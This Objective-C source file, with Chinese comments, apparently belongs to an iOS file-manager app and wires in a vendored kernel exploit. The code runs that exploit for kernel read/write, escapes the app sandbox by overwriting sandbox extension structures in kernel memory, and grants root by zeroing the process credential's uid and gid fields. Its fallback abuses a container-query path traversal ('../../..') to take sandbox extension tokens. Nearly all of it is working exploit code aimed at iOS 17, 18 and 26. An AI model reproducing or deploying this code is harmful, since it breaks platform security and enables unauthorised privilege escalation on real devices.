//
//  DS3105Kernel.m — 「3105 模式」内核后端适配层（唯一调用 3105 代码的地方）
//
//  隔离要点：
//    · DS3105SymbolPrefix.h 必须最先包含：它把 3105 自有符号统一改名 t3105_*，
//      这样它那份与现有后端同名的 kexploit/krw 实现不会与 FilzaJailedDS 侧冲突；
//    · 本文件只调用 3105 自己的入口，绝不调用、也绝不暴露我们的 kread/kwrite；
//    · 就绪状态是本文件自己的静态变量，与现有后端的 gEscaped 完全独立。
//
//  3105 的失败行为（未修改上游）：其 kexploit_abort 在漏洞阶段内用 longjmp 回到调用点
//  （上游注释写着 "app stays alive"），只有在漏洞阶段之外才会 exit()。比我们现有后端的
//  故意崩溃温和，但仍属于上游行为，故此处只做日志与错误码上报。
//

// 注意：这里全部用**显式相对路径**包含 3105 的头文件。
// 原因是两个内核后端各有一份同名的 krw.h / kutils.h / offsets.h，如果把 3105 的目录
// 加进 HEADER_SEARCH_PATHS，就可能让现有后端的 `#import "kexploit/krw.h"` 解析到 3105 那份。
// 显式相对路径（相对于本文件所在目录）可以彻底避免这种串台。
#import "../../Vendor/ThreeOneOSFive/DS3105SymbolPrefix.h"   // 必须最先：把 3105 自有符号改名 t3105_*

#import "../../Vendor/ThreeOneOSFive/kexploit/kexploit_opa334.h"
#import "../../Vendor/ThreeOneOSFive/kexploit/kutils.h"
#import "../../Vendor/ThreeOneOSFive/kexploit/sandbox_escape.h"
#import "../../Vendor/ThreeOneOSFive/exploit/bad_query.h"
#import "../../Vendor/ThreeOneOSFive/exploit/mcm_bridge.h"   // 只用 MCMBridgeAvailable 做可用性探测（纯用户态）

#import "DS3105Kernel.h"

#import <unistd.h>
#import <fcntl.h>
#import <errno.h>
#import <string.h>
#import <sys/utsname.h>

NSString * const DSKernelBackendDefaultsKey = @"myfilza.kernelBackend";
NSString * const DSKernelBackendValueFilza  = @"filzajailedds";
NSString * const DSKernelBackendValue3105   = @"3105";

/// 3105 侧状态：与现有后端的 gEscaped 完全独立
static BOOL      g3105Ready      = NO;
static NSString *g3105LastStage  = @"未开始";

/// 前置声明：下面的「纯用户态令牌」实现会先调用它（定义在文件稍后）
static BOOL ds3105_probe_write(void);

BOOL DS3105KernelAvailable(void) { return YES; }
BOOL DS3105KernelIsReady(void)   { return g3105Ready; }
NSString *DS3105KernelLastStage(void) { return g3105LastStage; }

BOOL DS3105KernelSelected(void)
{
    NSString *v = [[NSUserDefaults standardUserDefaults] stringForKey:DSKernelBackendDefaultsKey];
    return [v isEqualToString:DSKernelBackendValue3105];
}

NSString * const DS3105KernelUseKernelExploitKey = @"myfilza.3105UseKernelExploit";
NSString * const DSSafeModeDefaultsKey            = @"myfilza.safeMode";

/// 是否使用内核漏洞。**默认 YES**。
///
/// 依据（真机 + 源码取证）：
///   · 18.x 上真正能拿到容器访问的是「内核 R/W + cred 路线逃逸」—— 也就是当初在 Filza 那条路上
///     验证成功的那套；3105 本体在 iOS < 26 时同样是「保留内核 R/W」继续工作
///     （其 KernelExploit.swift 里写明：`if v.majorVersion < 26 { … return true }`）。
///   · 纯用户态 bad_query 令牌在 18.5 上**不可用**：libsystem_containermanager 里没有
///     `container_query_operation_set_part` / `…_set_part_domain` 两个符号 → bad_query 直接返回 -1。
///     它只在 iOS 26+ 才有意义，所以这里降级为**备选分支**。
///   · 仍然**绝不调用** 3105 的 proc_self / sandbox_escape（本机会自旋被 watchdog 杀）。
BOOL DS3105KernelUseKernelExploit(void)
{
    NSUserDefaults *d = [NSUserDefaults standardUserDefaults];
    if ([d objectForKey:DS3105KernelUseKernelExploitKey] == nil) return YES;   // 没设置过 = 开启（走能用的那条路）
    return [d boolForKey:DS3105KernelUseKernelExploitKey];
}

/// 安全模式：任何模式都不跑内核漏洞。**默认 NO**（不改变 FilzaJailedDS 的既有行为）。
BOOL DSSafeModeEnabled(void)
{
    NSUserDefaults *d = [NSUserDefaults standardUserDefaults];
    if ([d objectForKey:DSSafeModeDefaultsKey] == nil) return NO;
    return [d boolForKey:DSSafeModeDefaultsKey];
}

#pragma mark - 纯用户态令牌路径（bad_query + sandbox_extension_consume，完全不碰内核）

/// 已取过令牌的路径与句柄（进程内保持有效，不主动 release；上限 16 条）
static NSMutableArray<NSString *> *g3105TokenPaths   = nil;
static NSMutableArray<NSNumber *> *g3105TokenHandles = nil;

/// 需要访问的沙盒外根路径。按 3105 本体的用法：容器数据 + App 包体 + /var/mobile 兜底。
static NSArray<NSString *> *ds3105_default_token_roots(void)
{
    return @[
        @"/var/mobile",
        @"/var/mobile/Containers/Data/Application",
        @"/var/containers/Bundle/Application"
    ];
}

/// 为一个路径取一次用户态令牌。返回 YES = 拿到（或已缓存）。
///
/// 这条路径**完全不碰内核**：bad_query 内部是
///   dlopen(libsystem_containermanager) → container_query（class 13 +
///   systemgroup.com.apple.mobilegestaltcache + part_domain "../../../../../../../..<path>" 路径穿越）
///   → container_query_get_single_result → container_copy_sandbox_token
///   → sandbox_extension_consume
static BOOL ds3105_take_token_for_path(NSString *path)
{
    if (path.length == 0) return NO;

    static dispatch_once_t once;
    dispatch_once(&once, ^{
        g3105TokenPaths   = [NSMutableArray array];
        g3105TokenHandles = [NSMutableArray array];
    });

    @synchronized (g3105TokenPaths) {
        if ([g3105TokenPaths containsObject:path]) return YES;
        if (g3105TokenPaths.count >= 16) return NO;
    }

    int64_t handle = bad_query((char *)path.fileSystemRepresentation, false, NULL, false);
    if (handle < 0) {
        NSLog(@"[3105] bad_query(%@) 返回 %lld（未取得令牌）", path, (long long)handle);
        return NO;
    }

    @synchronized (g3105TokenPaths) {
        [g3105TokenPaths addObject:path];
        [g3105TokenHandles addObject:@(handle)];
    }
    NSLog(@"[3105] 已取得沙盒扩展令牌：%@（handle=%lld）", path, (long long)handle);
    return YES;
}

BOOL DS3105KernelEnsureAccessForPath(NSString *path)
{
    if (path.length == 0) return NO;
    if (access(path.fileSystemRepresentation, R_OK) == 0) return YES;   // 已经能读，不必再取
    return ds3105_take_token_for_path(path);
}

/// 纯用户态激活：逐个根路径取令牌 → 读写探针验证。全程不执行任何内核代码。
int DS3105KernelActivateUserspaceOnly(NSString *_Nullable *_Nullable detail)
{
    g3105LastStage = @"用户态令牌：开始取令牌";
    NSLog(@"[3105] 纯用户态路径（不执行任何内核代码）；mcm_bridge 可用=%d", (int)MCMBridgeAvailable());

    NSArray<NSString *> *roots = ds3105_default_token_roots();
    NSMutableArray<NSString *> *got = [NSMutableArray array];

    for (NSString *root in roots) {
        if (![NSFileManager.defaultManager fileExistsAtPath:root]) {
            NSLog(@"[3105] 跳过不存在的路径：%@", root);
            continue;
        }
        if (ds3105_take_token_for_path(root)) [got addObject:root];
    }

    g3105LastStage = [NSString stringWithFormat:@"用户态令牌：取到 %lu/%lu 条",
                      (unsigned long)got.count, (unsigned long)roots.count];

    BOOL writeOK = ds3105_probe_write();
    BOOL readOK  = (access("/var/mobile/Containers/Data/Application", R_OK) == 0)
                || (access("/var/containers/Bundle/Application", R_OK) == 0);

    if (!writeOK && !readOK) {
        if (detail) {
            *detail = [NSString stringWithFormat:
                       @"3105 模式（仅用户态）：bad_query 取得 %lu 条令牌（%@），但沙盒外读写探针都失败"
                        "——这条路径在你这个系统版本上可能已被修补。可在设置里显式开启「使用内核漏洞」再试"
                        "（该路径有崩溃/重启风险）。",
                       (unsigned long)got.count,
                       got.count ? [got componentsJoinedByString:@"、"] : @"无"];
        }
        return 1003;
    }

    g3105Ready = YES;
    g3105LastStage = writeOK ? @"完成：用户态令牌已取得沙盒外读写"
                             : @"完成：用户态令牌已取得沙盒外读权限";
    if (detail) {
        *detail = [NSString stringWithFormat:
                   @"3105 模式（仅用户态，未执行内核漏洞）：bad_query 取得 %lu 条沙盒扩展令牌（%@）；"
                    "沙盒外写=%@、读=%@。",
                   (unsigned long)got.count,
                   got.count ? [got componentsJoinedByString:@"、"] : @"无",
                   writeOK ? @"通过" : @"失败", readOK ? @"通过" : @"失败"];
    }
    return 0;
}

/// 只认「沙盒外路径能不能真的写进去」，不信任任何自报状态
static BOOL ds3105_probe_write(void)
{
    static const char *paths[] = {
        "/var/mobile/.myfilza_3105_probe",
        "/private/var/mobile/.myfilza_3105_probe",
        "/var/tmp/.myfilza_3105_probe",
        "/private/var/tmp/.myfilza_3105_probe"
    };
    for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
        int fd = open(paths[i], O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd >= 0) {
            close(fd);
            unlink(paths[i]);
            return YES;
        }
    }
    return NO;
}

/// 3105 官方声明的适用范围（与其 ExploitSupportPolicy.swift 一致）。
/// 这里只用于「提前提示」，不阻止执行——用户的目标是尽量适配更多版本，
/// 超出范围时会在日志里明确警告，失败也会给出原因。
static BOOL ds3105_version_in_declared_range(void)
{
    NSOperatingSystemVersion v = NSProcessInfo.processInfo.operatingSystemVersion;
    long major = (long)v.majorVersion, minor = (long)v.minorVersion, patch = (long)v.patchVersion;

    if (major == 17) return minor <= 7;
    if (major == 18) return minor < 7 || (minor == 7 && patch <= 1);
    if (major == 26) return minor < 6 || (minor == 6 && patch <= 1);
    if (major == 27) return minor == 0 && patch == 0;   // 27 beta（按 build 白名单，这里放行 27.0）
    return NO;
}

#pragma mark - cred 路线逃逸（当年在 Filza 那条路上验证成功的那套，原语换成 3105 的）

// 无条件 XPACI：**不依赖** 3105 的 S() / __xpaci_sbx 宏——它可能只在 #ifdef __arm64e__ 下
// 才编译出真正的 XPACI 指令，而本 App 产物是 arm64，那样 S() 会退化成"原样返回"，
// 拿带 PAC 签名的 cr_label 去解引用就会打到错误地址。
// arm64 产物在 arm64e 硬件上可以直接执行这条指令。
static uint64_t __attribute__((naked)) ds3105_xpaci(uint64_t value)
{
    __asm__ volatile(".long 0xDAC143E0");   // XPACI X0
    __asm__ volatile("ret");
}

static inline BOOL ds3105_is_kaddr(uint64_t a)
{
    return (a & 0xfffff00000000000ULL) == 0xfffff00000000000ULL;
}

// zone 段（ucred/label/sandbox/ext_set 这类动态对象实测都落在这里）
static inline BOOL ds3105_is_zone(uint64_t a)
{
    return a >= 0xffffffc000000000ULL && a < 0xfffffff000000000ULL && (a & 0x7) == 0;
}

/// 与上游 S() 同语义：先 XPACI 剥签名，再按需补内核高位
static uint64_t ds3105_S(uint64_t raw)
{
    if (!raw) return 0;
    uint64_t v = ds3105_xpaci(raw);
    if ((v >> 32) > 0xFFFF) v |= 0xFFFF800000000000ULL;
    return v;
}

/// 定位本进程 cred：两个 socket 的 so_cred 指向同一对象 + cr_uid 校验
/// （历史 4/4 命中 socket+0x208；这里用有界扫描 0x1f0~0x230，不写死偏移）
static uint64_t ds3105_find_cred(NSString **why)
{
    uint64_t rwPcb  = t3105_rwSocketPcb;
    uint64_t ctlPcb = t3105_controlSocketPcb;
    if (!ds3105_is_kaddr(rwPcb) || !ds3105_is_kaddr(ctlPcb)) {
        if (why) *why = @"socket pcb invalid (kernel stage not established?)";
        return 0;
    }
    uint64_t s0 = t3105_kread64(rwPcb  + t3105_off_inpcb_inp_socket);
    uint64_t s1 = t3105_kread64(ctlPcb + t3105_off_inpcb_inp_socket);
    if (!ds3105_is_kaddr(s0) || !ds3105_is_kaddr(s1)) {
        if (why) *why = @"socket object address invalid";
        return 0;
    }

    uid_t me = getuid();
    for (uint64_t off = 0x1f0; off <= 0x230; off += 8) {
        uint64_t a = t3105_kread64(s0 + off);
        if (!a) continue;
        uint64_t b = t3105_kread64(s1 + off);
        if (a != b) continue;
        if (!ds3105_is_kaddr(a) || (a & 0xF) != 0) continue;
        // posix_cred 在 ucred+0x18，cr_uid 在它开头
        if (t3105_kread32(a + 0x18) != (uint32_t)me) continue;
        return a;
    }
    if (why) *why = @"no shared so_cred passing cr_uid check";
    return 0;
}

/// 改写单个扩展（照抄 3105 sandbox_escape.m 的 set_rw_class 语义）：
///   data 指向的字符串改成 "/"；da+32 写类别；da+64 清零；hdr+0x10 = da+32
static int ds3105_patch_slot(uint64_t hdr)
{
    uint64_t ext = ds3105_S(t3105_kread64(hdr + 0x8));
    if (!ds3105_is_kaddr(ext)) return 0;

    uint64_t da  = t3105_kread64(ext + 0x40);   // ext → data
    uint64_t len = t3105_kread64(ext + 0x48);   // ext → data_len
    if (!ds3105_is_kaddr(da)) return 0;

    uint8_t buf[32];
    if (len > 0) {
        t3105_early_kread(da, buf, 32);
        buf[0] = '/';
        buf[1] = 0;
        t3105_early_kwrite32bytes(da, buf);
    }
    memset(buf, 0, sizeof(buf));
    memcpy(buf, "com.apple.app-sandbox.read-write", 31);
    t3105_early_kwrite32bytes(da + 32, buf);

    memset(buf, 0, sizeof(buf));
    t3105_early_kwrite32bytes(da + 64, buf);

    uint8_t hb[32];
    t3105_early_kread(hdr, hb, 32);
    *(uint64_t *)(hb + 0x10) = da + 32;
    t3105_early_kwrite32bytes(hdr, hb);
    return 1;
}

/// cred → label → sandbox → ext_set，然后 16 个槽逐个改写 + 补空槽。
/// 每一跳解引用前都校验（内核地址 + zone 段 + 对齐）；不成立就干净失败，绝不写内核。
static int ds3105_cred_escape(NSString **why)
{
    NSString *w = nil;
    uint64_t cred = ds3105_find_cred(&w);
    if (!cred) {
        if (why) *why = w ?: @"cred not found";
        return -1;
    }

    uint64_t labelRaw = t3105_kread64(cred + t3105_off_ucred_cr_label);
    uint64_t label = ds3105_S(labelRaw);
    if (!ds3105_is_kaddr(label) || !ds3105_is_zone(label)) {
        if (why) *why = [NSString stringWithFormat:@"label invalid (raw=0x%llx dec=0x%llx)",
                         (unsigned long long)labelRaw, (unsigned long long)label];
        return -2;
    }

    uint64_t sandboxRaw = t3105_kread64(label + t3105_off_label_l_perpolicy_sandbox);
    uint64_t sandbox = ds3105_S(sandboxRaw);
    if (!ds3105_is_kaddr(sandbox) || !ds3105_is_zone(sandbox)) {
        if (why) *why = [NSString stringWithFormat:@"sandbox invalid (raw=0x%llx dec=0x%llx)",
                         (unsigned long long)sandboxRaw, (unsigned long long)sandbox];
        return -2;
    }

    uint64_t extSetRaw = t3105_kread64(sandbox + 0x10);
    uint64_t extSet = ds3105_S(extSetRaw);
    if (!ds3105_is_kaddr(extSet) || !ds3105_is_zone(extSet)) {
        if (why) *why = [NSString stringWithFormat:@"ext_set invalid (raw=0x%llx dec=0x%llx)",
                         (unsigned long long)extSetRaw, (unsigned long long)extSet];
        return -2;
    }

    int patched = 0;
    uint64_t firstHdr = 0;
    for (int slot = 0; slot < 16; slot++) {
        uint64_t hdr = ds3105_S(t3105_kread64(extSet + (uint64_t)slot * 8));
        if (!ds3105_is_kaddr(hdr) || !ds3105_is_zone(hdr)) continue;
        if (!firstHdr) firstHdr = hdr;
        patched += ds3105_patch_slot(hdr);
    }
    if (patched == 0) {
        if (why) *why = @"no extension patched";
        return -4;
    }

    if (firstHdr) {
        for (int slot = 0; slot < 16; slot++) {
            if (t3105_kread64(extSet + (uint64_t)slot * 8) == 0) {
                t3105_kwrite64(extSet + (uint64_t)slot * 8, firstHdr);
            }
        }
    }

    if (why) {
        *why = [NSString stringWithFormat:@"cred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx patched=%d",
                (unsigned long long)cred, (unsigned long long)label,
                (unsigned long long)sandbox, (unsigned long long)extSet, patched];
    }
    return 0;
}

int DS3105KernelElevateToRoot(NSString *_Nullable *_Nullable detail)
{
    NSString *w = nil;
    uint64_t cred = ds3105_find_cred(&w);
    if (!cred) {
        if (detail) *detail = [NSString stringWithFormat:@"elevate: cred not found (%@)", w ?: @""];
        return 1010;
    }
    if (!ds3105_is_kaddr(cred) || (cred & 0xF) != 0) {
        if (detail) *detail = @"elevate: cred address rejected by gate";
        return 1011;
    }

    // posix_cred 在 ucred+0x18：uid/ruid/svuid/groups/rgid/svgid
    const uint64_t posix = cred + 0x18;
    t3105_kwrite32(posix + 0x00, 0);   // cr_uid
    t3105_kwrite32(posix + 0x04, 0);   // cr_ruid
    t3105_kwrite32(posix + 0x08, 0);   // cr_svuid
    t3105_kwrite32(posix + 0x10, 0);   // cr_groups[0]
    t3105_kwrite32(posix + 0x50, 0);   // cr_rgid
    t3105_kwrite32(posix + 0x54, 0);   // cr_svgid

    uint32_t uid = t3105_kread32(posix + 0x00);
    uint32_t rgid = t3105_kread32(posix + 0x50);
    if (detail) {
        *detail = [NSString stringWithFormat:
                   @"elevate: cred=0x%llx cr_uid=%u cr_rgid=%u (getuid()=%u)",
                   (unsigned long long)cred, uid, rgid, (unsigned)getuid()];
    }
    return (uid == 0) ? 0 : 1012;
}

int DS3105KernelActivate(NSString *_Nullable *_Nullable detail)
{
    g3105Ready = NO;
    g3105LastStage = @"prepare";

    BOOL safeMode  = DSSafeModeEnabled();
    BOOL useKernel = DS3105KernelUseKernelExploit() && !safeMode;
    NSMutableArray<NSString *> *reasons = [NSMutableArray array];

    // 说明（英文，避免 stdout 捕获时的编码问题）：
    //   3105 模式在 18.x 上真正能用的路径 = 内核 R/W + cred 路线逃逸。
    //   bad_query 用户态令牌只在 iOS 26+ 才有意义（18.5 上缺 container_query_operation_set_part*
    //   符号 → 0 条令牌），所以它降级为备选分支。
    if (!useKernel) {
        NSLog(@"[3105] userspace-only (safeMode=%d, useKernel=0)", (int)safeMode);
        g3105LastStage = @"userspace tokens only";
        NSString *up = nil;
        int r = DS3105KernelActivateUserspaceOnly(&up);
        if (detail) {
            *detail = [NSString stringWithFormat:@"3105 userspace-only: %@", up ?: @""];
        }
        return r;
    }

    if (!ds3105_version_in_declared_range()) {
        NSLog(@"[3105] warning: OS outside 3105 declared range; still trying (offset table is runtime-derived)");
    }

    // ---- 阶段 1：内核读写（3105 自带运行时 offset 反推）----
    // **绝不调用 t3105_proc_self / t3105_sandbox_escape**：本机 so_background_thread == 0
    // → 它们会拿 0 当 thread 去读 off_thread_t_tro(=0x388) → 3105 的 early_kread 遇非法地址
    // 是**原地自旋**（不是返回失败）→ 被系统 watchdog 杀掉进程（设备不重启、也无崩溃日志）。
    g3105LastStage = @"stage1: kexploit_opa334 (kernel r/w)";
    NSLog(@"[3105] stage1: kernel r/w via kexploit_opa334 (proc_self/sandbox_escape NOT used)");
    int kret = t3105_kexploit_opa334();
    [reasons addObject:[NSString stringWithFormat:@"kernel=kexploit_opa334(%d)", kret]];

    if (kret == 0) {
        // ---- 阶段 2：cred 路线逃逸（当年 Filza 那条路成功的那套）----
        g3105LastStage = @"stage2: cred route escape";
        NSLog(@"[3105] stage2: cred route escape");
        NSString *ew = nil;
        int eret = ds3105_cred_escape(&ew);
        [reasons addObject:[NSString stringWithFormat:@"escape(%d) %@", eret, ew ?: @""]];

        if (eret == 0 && ds3105_probe_write()) {
            g3105Ready = YES;
            g3105LastStage = @"done: kernel r/w + cred escape";
            if (detail) *detail = [reasons componentsJoinedByString:@" | "];
            return 0;
        }
        if (eret == 0) {
            [reasons addObject:@"probe: outside-sandbox write failed after escape"];
        }
    }

    // ---- 阶段 3：备选（纯用户态令牌；18.x 上通常失败，26+ 才可能需要）----
    g3105LastStage = @"stage3: userspace tokens (fallback)";
    NSLog(@"[3105] stage3: userspace tokens (fallback)");
    NSString *up = nil;
    int upRet = DS3105KernelActivateUserspaceOnly(&up);
    [reasons addObject:[NSString stringWithFormat:@"tokens(%d) %@", upRet, up ?: @""]];

    if (upRet == 0 && ds3105_probe_write()) {
        g3105Ready = YES;
        g3105LastStage = @"done: userspace tokens";
        if (detail) *detail = [reasons componentsJoinedByString:@" | "];
        return 0;
    }

    g3105LastStage = @"failed: all stages";
    if (detail) {
        *detail = [NSString stringWithFormat:@"3105 mode failed — %@", [reasons componentsJoinedByString:@" | "]];
    }
    return 1002;
}
